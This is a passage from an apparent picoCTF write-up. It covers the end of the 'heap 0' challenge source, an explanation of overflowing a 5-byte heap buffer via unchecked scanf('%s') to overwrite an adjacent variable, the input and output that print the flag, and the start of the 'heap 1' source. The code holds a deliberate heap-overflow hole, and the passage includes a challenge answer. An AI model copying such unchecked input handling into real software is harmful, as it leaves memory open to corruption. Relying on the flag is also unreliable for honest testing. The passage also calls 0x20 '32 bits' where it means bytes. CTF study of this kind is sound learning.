</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 81</span><span><span style="color:#6c7086;font-style:italic"></span>    <span style="color:#89b4fa">init</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 82</span><span>    <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 83</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 84</span><span>    <span style="color:#f38ba8">int</span> choice;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 85</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 86</span><span>    <span style="color:#cba6f7">while</span> (<span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 87</span><span>        <span style="color:#89b4fa">print_menu</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 88</span><span>	<span style="color:#f38ba8">int</span> rval <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%d&#34;</span>, <span style="color:#89dceb;font-weight:bold">&amp;</span>choice);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 89</span><span>	<span style="color:#cba6f7">if</span> (rval <span style="color:#89dceb;font-weight:bold">==</span> EOF){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 90</span><span>	    <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 91</span><span>	}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 92</span><span>        <span style="color:#cba6f7">if</span> (rval <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 93</span><span>            <span style="color:#6c7086;font-style:italic">//printf(&#34;Invalid input. Please enter a valid choice.\n&#34;);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 94</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//fflush(stdout);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 95</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">// Clear input buffer
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 96</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//while (getchar() != &#39;\n&#39;);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 97</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//continue;
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 98</span><span><span style="color:#6c7086;font-style:italic"></span>	    <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 99</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">100</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">101</span><span>        <span style="color:#cba6f7">switch</span> (choice) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">102</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">103</span><span>            <span style="color:#6c7086;font-style:italic">// print heap
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">104</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">105</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">106</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">2</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">107</span><span>            <span style="color:#89b4fa">write_buffer</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">108</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">109</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">3</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">110</span><span>            <span style="color:#6c7086;font-style:italic">// print safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">111</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Take a look at my variable: safe_var = %s</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">112</span><span>                   safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">113</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">114</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">115</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">4</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">116</span><span>            <span style="color:#6c7086;font-style:italic">// Check for win condition
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">117</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">check_win</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">118</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">119</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">5</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">120</span><span>            <span style="color:#6c7086;font-style:italic">// exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">121</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">122</span><span>        <span style="color:#cba6f7">default</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">123</span><span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Invalid choice</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">124</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">125</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">126</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">127</span><span>}</span></span></code></pre></div>
<p>If you look closely at the <code>check_win</code> function, our job is to make <code>safe_var</code> variable and the string <code>bico</code> not equal to each other. We can see that the variables <code>input_data</code> and <code>safe_var</code> are allocated 5 bytes of memory. The allocations are likely to be sequential, meaning <code>input_data</code> and <code>safe_var</code> are placed next to each other in memory.</p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>}</span></span></code></pre></div>
<p>Check out the <code>write_buffer</code> function. We can write data to <code>input_data</code> variable, meaning if we write more data than it can hold, it will result in a <strong><em>buffer overflow</em></strong> and the extra bytes will overflow into the memory space allocated for <code>safe_var</code> and eventually overwrite the data of <code>safe_var</code> variable.</p>
<p>First, we are going to select <code>2</code> to write to buffer, and as we can see from the heap table, the address of <strong>input_data</strong> is <code>0x5e2f114332b0</code> and the address of <strong>safe_var</strong> is <code>0x5e2f114332d0</code>. They are 0x20 hexadecimal digits, or 32 bits apart. Therefore, all we gotta do is input more than 32 bits to overflow the input_data and eventually overwrite safe_var variable.</p>






<pre tabindex="0"><code>1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyz1234567890

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = 7890


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}</code></pre>
<p><strong><em>flag</em></strong>: picoCTF{my_first_heap_overflow_c3935a08}</p>
<hr>
<h3 id="heap-1">heap 1</h3>
<p><em>author: ABRXS, PR1OR1TYQ</em></p>
<h4 id="description-1">Description</h4>
<p>Can you control your overflow?
Connect with the challenge instance here:
nc tethys.picoctf.net 50046</p>
<hr>
<br>
<p>Here is the source code provided</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  2</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  3</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  4</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  5</span><span><span style="color:#6c7086;font-style:italic">#define FLAGSIZE_MAX 64
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  6</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for input_data
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  7</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define INPUT_DATA_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  9</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define SAFE_VAR_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 10</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 11</span><span><span style="color:#f38ba8">int</span> num_allocs;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 12</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>safe_var;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 13</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>input_data;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 15</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 16</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;pico&#34;</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 17</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 19</span><span>        <span style="color:#6c7086;font-style:italic">// Print flag
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 20</span><span><span style="color:#6c7086;font-style:italic"></span>        <span style="color:#f38ba8">char</span> buf[FLAGSIZE_MAX];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 21</span><span>        FILE <span style="color:#89dceb;font-weight:bold">*</span>fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 22</span><span>        <span style="color:#89b4fa">fgets</span>(buf, FLAGSIZE_MAX, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 23</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 24</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 26</span><span>        <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 27</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 28</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Looks like everything is still secure!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 29</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">No flage for you :(</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 30</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 31</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 32</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 34</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_menu</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 35</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">1. Print Heap:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(print the current state of the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 36</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">2. Write to buffer:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(write to your own personal block of data &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 37</span><span>           <span style="color:#a6e3a1">&#34;on the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 38</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">3. Print safe_var:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(I&#39;ll even let you look at my variable on &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 39</span><span>           <span style="color:#a6e3a1">&#34;the heap, &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 40</span><span>           <span style="color:#a6e3a1">&#34;I&#39;m confident it can&#39;t be modified)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 41</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">4. Print Flag:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(Try to print the flag, good luck)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 42</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">5. Exit</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Enter your choice: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 43</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 44</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 45</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 46</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 47</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">Welcome to heap1!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 48</span><span>    <span style="color:#89b4fa">printf</span>(
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 49</span><span>        <span style="color:#a6e3a1">&#34;I put my data on the heap so it should be safe from any tampering.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 50</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 51</span><span>           <span style="color:#a6e3a1">&#34;info you want to the heap, I already took care of using malloc for &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 52</span><span>           <span style="color:#a6e3a1">&#34;you.</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 53</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
